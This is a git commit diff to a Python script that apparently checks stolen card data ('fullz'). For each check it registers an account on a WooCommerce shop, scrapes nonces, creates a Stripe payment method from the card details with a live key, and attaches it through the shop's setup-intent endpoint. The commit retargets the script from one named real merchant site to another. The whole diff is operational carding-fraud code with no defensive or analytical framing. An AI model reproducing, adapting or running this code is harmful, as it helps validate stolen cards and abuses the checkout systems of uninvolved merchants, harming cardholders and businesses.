b9c2dd07995ac2e9ff8e1a45744f938fa81cd33d
Matrix <66746496+Matrix-jailer@users.noreply.github.com>
2025-09-17 15:18:54 +0500

    Update app.py

--- app.py
+++ app.py
@@ -97,7 +97,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
 
         # STEP 1: register nonce
         register_nonce = generate_nonce()
-        response = await session.get("https://plumedhorse.com/my-account/", headers=headers)
+        response = await session.get("https://www.greenkidcrafts.com/my-account/", headers=headers)
         _ = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
 
         # STEP 2: register user
@@ -107,10 +107,10 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "_wp_http_referer": "/my-account/",
             "register": "Register",
         }
-        await session.post("https://plumedhorse.com/my-account/", headers=headers, data=data)
+        await session.post("https://www.greenkidcrafts.com/my-account/", headers=headers, data=data)
 
         # STEP 3: add payment page
-        response = await session.get("https://plumedhorse.com/my-account/add-payment-method/", headers=headers)
+        response = await session.get("https://www.greenkidcrafts.com/my-account/add-payment-method/", headers=headers)
         setup_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '","')
 
         # STEP 4: Stripe payment method
@@ -121,7 +121,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "billing_details[address][country]": "PK",
-            "key": "pk_live_51FRQqWFEsbAzY3XHuSxfDPcAf3dSkTf16xSyKlWynDoHra9G6pOZc1UB58TRNKNTcthJvCktoAbBmeKe3u23aJhS00u7OqYyCs",
+            "key": "pk_live_UdiYedvkJma7qlJ03Y7zYVAN00tSNEOnQE",
         }
         resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
 
@@ -138,14 +138,15 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
         params = {
             'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
         }
-        # STEP 5: attach payment
+
         data = {
             'action': 'create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': setup_nonce,
         }
-        final = await session.post("https://plumedhorse.com/", params=params, headers=headers, data=data)
+        
+        final = await session.post("https://www.greenkidcrafts.com/", params=params, headers=headers, data=data)
 
         # RESPONSE
         try:
